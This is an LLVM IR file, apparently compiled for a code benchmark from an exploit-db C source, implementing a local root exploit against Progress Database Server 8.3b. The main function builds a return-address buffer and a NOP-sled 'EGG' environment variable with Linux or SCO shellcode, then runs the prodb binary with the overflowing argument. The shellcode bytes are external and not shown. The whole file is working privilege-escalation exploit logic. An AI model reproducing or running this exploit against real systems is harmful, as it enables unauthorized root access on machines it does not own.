; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/local/extr_288.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/local/extr_288.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@DEFAULT_OFFSET = common dso_local global i32 0, align 4
@DEFAULT_BUFFER_SIZE = common dso_local global i32 0, align 4
@DEFAULT_EGG_SIZE = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [44 x i8] c"\0AProgress Database Server v8.3b local root\0A\00", align 1
@.str.1 = private unnamed_addr constant [34 x i8] c"\0AUsage: %s <*nix type> [offset]\0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [11 x i8] c"1 = linux\0A\00", align 1
@.str.3 = private unnamed_addr constant [15 x i8] c"2 = sco-unix\0A\0A\00", align 1
@.str.4 = private unnamed_addr constant [60 x i8] c"offset is not required, but should be near -50 through 50\0A\0A\00", align 1
@.str.5 = private unnamed_addr constant [40 x i8] c"Unable to allocate memory for %d bytes\0A\00", align 1
@.str.6 = private unnamed_addr constant [54 x i8] c"\0A --== Progress Database Server 8.3b local root ==--\0A\00", align 1
@.str.7 = private unnamed_addr constant [35 x i8] c"         Coded by The Itch / BsE\0A\0A\00", align 1
@.str.8 = private unnamed_addr constant [28 x i8] c"Using return address: 0x%x\0A\00", align 1
@.str.9 = private unnamed_addr constant [24 x i8] c"Using offset      : %d\0A\00", align 1
@.str.10 = private unnamed_addr constant [26 x i8] c"Using buffersize    : %d\0A\00", align 1
@linux_shellcode = common dso_local global i8** null, align 8
@NOP = common dso_local global i8* null, align 8
@sco_shellcode = common dso_local global i8** null, align 8
@.str.11 = private unnamed_addr constant [5 x i8] c"EGG=\00", align 1
@.str.12 = private unnamed_addr constant [5 x i8] c"RET=\00", align 1
@.str.13 = private unnamed_addr constant [32 x i8] c"/usr/dlc/bin/prodb  sports $RET\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i64*, align 8
  %10 = alloca i64, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %16 = load i32, i32* @DEFAULT_OFFSET, align 4
  store i32 %16, i32* %11, align 4
  %17 = load i32, i32* @DEFAULT_BUFFER_SIZE, align 4
  store i32 %17, i32* %12, align 4
  %18 = load i32, i32* @DEFAULT_EGG_SIZE, align 4
  store i32 %18, i32* %13, align 4
  store i32 0, i32* %14, align 4
  %19 = load i32, i32* %4, align 4
  %20 = icmp slt i32 %19, 2
  br i1 %20, label %21, label %31

21:                                               ; preds = %2
  %22 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str, i64 0, i64 0))
  %23 = load i8**, i8*** %5, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 0
  %25 = load i8*, i8** %24, align 8
  %26 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.1, i64 0, i64 0), i8* %25)
  %27 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.2, i64 0, i64 0))
  %28 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.3, i64 0, i64 0))
  %29 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.4, i64 0, i64 0))
  %30 = call i32 @exit(i32 0) #3
  unreachable

31:                                               ; preds = %2
  %32 = load i32, i32* %4, align 4
  %33 = icmp sgt i32 %32, 1
  br i1 %33, label %34, label %39

34:                                               ; preds = %31
  %35 = load i8**, i8*** %5, align 8
  %36 = getelementptr inbounds i8*, i8** %35, i64 1
  %37 = load i8*, i8** %36, align 8
  %38 = call i32 @atoi(i8* %37)
  store i32 %38, i32* %14, align 4
  br label %39

39:                                               ; preds = %34, %31
  %40 = load i32, i32* %4, align 4
  %41 = icmp sgt i32 %40, 2
  br i1 %41, label %42, label %47

42:                                               ; preds = %39
  %43 = load i8**, i8*** %5, align 8
  %44 = getelementptr inbounds i8*, i8** %43, i64 2
  %45 = load i8*, i8** %44, align 8
  %46 = call i32 @atoi(i8* %45)
  store i32 %46, i32* %11, align 4
  br label %47

47:                                               ; preds = %42, %39
  %48 = load i32, i32* %12, align 4
  %49 = call i8* @malloc(i32 %48)
  store i8* %49, i8** %6, align 8
  %50 = icmp ne i8* %49, null
  br i1 %50, label %55, label %51

51:                                               ; preds = %47
  %52 = load i32, i32* %12, align 4
  %53 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.5, i64 0, i64 0), i32 %52)
  %54 = call i32 @exit(i32 0) #3
  unreachable

55:                                               ; preds = %47
  %56 = load i32, i32* %13, align 4
  %57 = call i8* @malloc(i32 %56)
  store i8* %57, i8** %7, align 8
  %58 = icmp ne i8* %57, null
  br i1 %58, label %63, label %59

59:                                               ; preds = %55
  %60 = load i32, i32* %13, align 4
  %61 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.5, i64 0, i64 0), i32 %60)
  %62 = call i32 @exit(i32 0) #3
  unreachable

63:                                               ; preds = %55
  %64 = call i32 (...) @get_sp()
  %65 = load i32, i32* %11, align 4
  %66 = sub nsw i32 %64, %65
  %67 = sext i32 %66 to i64
  store i64 %67, i64* %10, align 8
  %68 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.6, i64 0, i64 0))
  %69 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.7, i64 0, i64 0))
  %70 = load i64, i64* %10, align 8
  %71 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.8, i64 0, i64 0), i64 %70)
  %72 = load i32, i32* %11, align 4
  %73 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.9, i64 0, i64 0), i32 %72)
  %74 = load i32, i32* %12, align 4
  %75 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.10, i64 0, i64 0), i32 %74)
  %76 = load i8*, i8** %6, align 8
  store i8* %76, i8** %8, align 8
  %77 = load i8*, i8** %8, align 8
  %78 = bitcast i8* %77 to i64*
  store i64* %78, i64** %9, align 8
  store i32 0, i32* %15, align 4
  br label %79

79:                                               ; preds = %87, %63
  %80 = load i32, i32* %15, align 4
  %81 = load i32, i32* %12, align 4
  %82 = icmp slt i32 %80, %81
  br i1 %82, label %83, label %90

83:                                               ; preds = %79
  %84 = load i64, i64* %10, align 8
  %85 = load i64*, i64** %9, align 8
  %86 = getelementptr inbounds i64, i64* %85, i32 1
  store i64* %86, i64** %9, align 8
  store i64 %84, i64* %85, align 8
  br label %87

87:                                               ; preds = %83
  %88 = load i32, i32* %15, align 4
  %89 = add nsw i32 %88, 4
  store i32 %89, i32* %15, align 4
  br label %79

90:                                               ; preds = %79
  %91 = load i8*, i8** %7, align 8
  store i8* %91, i8** %8, align 8
  %92 = load i32, i32* %14, align 4
  %93 = icmp eq i32 %92, 1
  br i1 %93, label %94, label %112

94:                                               ; preds = %90
  store i32 0, i32* %15, align 4
  br label %95

95:                                               ; preds = %108, %94
  %96 = load i32, i32* %15, align 4
  %97 = load i32, i32* %13, align 4
  %98 = load i8**, i8*** @linux_shellcode, align 8
  %99 = call i32 @strlen(i8** %98)
  %100 = sub nsw i32 %97, %99
  %101 = sub nsw i32 %100, 1
  %102 = icmp slt i32 %96, %101
  br i1 %102, label %103, label %111

103:                                              ; preds = %95
  %104 = load i8*, i8** @NOP, align 8
  %105 = ptrtoint i8* %104 to i8
  %106 = load i8*, i8** %8, align 8
  %107 = getelementptr inbounds i8, i8* %106, i32 1
  store i8* %107, i8** %8, align 8
  store i8 %105, i8* %106, align 1
  br label %108

108:                                              ; preds = %103
  %109 = load i32, i32* %15, align 4
  %110 = add nsw i32 %109, 1
  store i32 %110, i32* %15, align 4
  br label %95

111:                                              ; preds = %95
  br label %112

112:                                              ; preds = %111, %90
  %113 = load i32, i32* %14, align 4
  %114 = icmp eq i32 %113, 2
  br i1 %114, label %115, label %133

115:                                              ; preds = %112
  store i32 0, i32* %15, align 4
  br label %116

116:                                              ; preds = %129, %115
  %117 = load i32, i32* %15, align 4
  %118 = load i32, i32* %13, align 4
  %119 = load i8**, i8*** @sco_shellcode, align 8
  %120 = call i32 @strlen(i8** %119)
  %121 = sub nsw i32 %118, %120
  %122 = sub nsw i32 %121, 1
  %123 = icmp slt i32 %117, %122
  br i1 %123, label %124, label %132

124:                                              ; preds = %116
  %125 = load i8*, i8** @NOP, align 8
  %126 = ptrtoint i8* %125 to i8
  %127 = load i8*, i8** %8, align 8
  %128 = getelementptr inbounds i8, i8* %127, i32 1
  store i8* %128, i8** %8, align 8
  store i8 %126, i8* %127, align 1
  br label %129

129:                                              ; preds = %124
  %130 = load i32, i32* %15, align 4
  %131 = add nsw i32 %130, 1
  store i32 %131, i32* %15, align 4
  br label %116

132:                                              ; preds = %116
  br label %133

133:                                              ; preds = %132, %112
  %134 = load i32, i32* %14, align 4
  %135 = icmp eq i32 %134, 1
  br i1 %135, label %136, label %155

136:                                              ; preds = %133
  store i32 0, i32* %15, align 4
  br label %137

137:                                              ; preds = %151, %136
  %138 = load i32, i32* %15, align 4
  %139 = load i8**, i8*** @linux_shellcode, align 8
  %140 = call i32 @strlen(i8** %139)
  %141 = icmp slt i32 %138, %140
  br i1 %141, label %142, label %154

142:                                              ; preds = %137
  %143 = load i8**, i8*** @linux_shellcode, align 8
  %144 = load i32, i32* %15, align 4
  %145 = sext i32 %144 to i64
  %146 = getelementptr inbounds i8*, i8** %143, i64 %145
  %147 = load i8*, i8** %146, align 8
  %148 = ptrtoint i8* %147 to i8
  %149 = load i8*, i8** %8, align 8
  %150 = getelementptr inbounds i8, i8* %149, i32 1
  store i8* %150, i8** %8, align 8
  store i8 %148, i8* %149, align 1
  br label %151

151:                                              ; preds = %142
  %152 = load i32, i32* %15, align 4
  %153 = add nsw i32 %152, 1
  store i32 %153, i32* %15, align 4
  br label %137

154:                                              ; preds = %137
  br label %155

155:                                              ; preds = %154, %133
  %156 = load i32, i32* %14, align 4
  %157 = icmp eq i32 %156, 2
  br i1 %157, label %158, label %177

158:                                              ; preds = %155
  store i32 0, i32* %15, align 4
  br label %159

159:                                              ; preds = %173, %158
  %160 = load i32, i32* %15, align 4
  %161 = load i8**, i8*** @sco_shellcode, align 8
  %162 = call i32 @strlen(i8** %161)
  %163 = icmp slt i32 %160, %162
  br i1 %163, label %164, label %176

164:                                              ; preds = %159
  %165 = load i8**, i8*** @sco_shellcode, align 8
  %166 = load i32, i32* %15, align 4
  %167 = sext i32 %166 to i64
  %168 = getelementptr inbounds i8*, i8** %165, i64 %167
  %169 = load i8*, i8** %168, align 8
  %170 = ptrtoint i8* %169 to i8
  %171 = load i8*, i8** %8, align 8
  %172 = getelementptr inbounds i8, i8* %171, i32 1
  store i8* %172, i8** %8, align 8
  store i8 %170, i8* %171, align 1
  br label %173

173:                                              ; preds = %164
  %174 = load i32, i32* %15, align 4
  %175 = add nsw i32 %174, 1
  store i32 %175, i32* %15, align 4
  br label %159

176:                                              ; preds = %159
  br label %177

177:                                              ; preds = %176, %155
  %178 = load i8*, i8** %6, align 8
  %179 = load i32, i32* %12, align 4
  %180 = sub nsw i32 %179, 1
  %181 = sext i32 %180 to i64
  %182 = getelementptr inbounds i8, i8* %178, i64 %181
  store i8 0, i8* %182, align 1
  %183 = load i8*, i8** %7, align 8
  %184 = load i32, i32* %13, align 4
  %185 = sub nsw i32 %184, 1
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds i8, i8* %183, i64 %186
  store i8 0, i8* %187, align 1
  %188 = load i8*, i8** %7, align 8
  %189 = call i32 @memcpy(i8* %188, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i64 0, i64 0), i32 4)
  %190 = load i8*, i8** %7, align 8
  %191 = call i32 @putenv(i8* %190)
  %192 = load i8*, i8** %6, align 8
  %193 = call i32 @memcpy(i8* %192, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i64 0, i64 0), i32 4)
  %194 = load i8*, i8** %6, align 8
  %195 = call i32 @putenv(i8* %194)
  %196 = call i32 @system(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.13, i64 0, i64 0))
  ret i32 0
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @atoi(i8*) #1

declare dso_local i8* @malloc(i32) #1

declare dso_local i32 @get_sp(...) #1

declare dso_local i32 @strlen(i8**) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @putenv(i8*) #1

declare dso_local i32 @system(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
